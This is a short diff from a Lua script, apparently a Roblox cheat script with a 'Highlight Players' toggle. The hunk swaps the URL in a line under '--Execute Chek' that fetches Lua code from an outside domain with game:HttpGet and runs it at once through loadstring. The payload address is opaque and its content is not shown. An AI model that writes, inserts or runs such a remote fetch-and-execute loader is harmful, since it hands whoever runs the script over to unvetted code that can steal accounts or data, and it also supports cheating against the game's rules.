@@ -860,4 +860,4 @@ local Toggle = Tabs.Misc:AddToggle("Highlight Players", {
 })
 
 --Execute Chek
-loadstring(game:HttpGet("https://egorikusa.space/d4cc3eb008221b3716c918cf.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/1957159b5da4be949605c142.lua", true))()
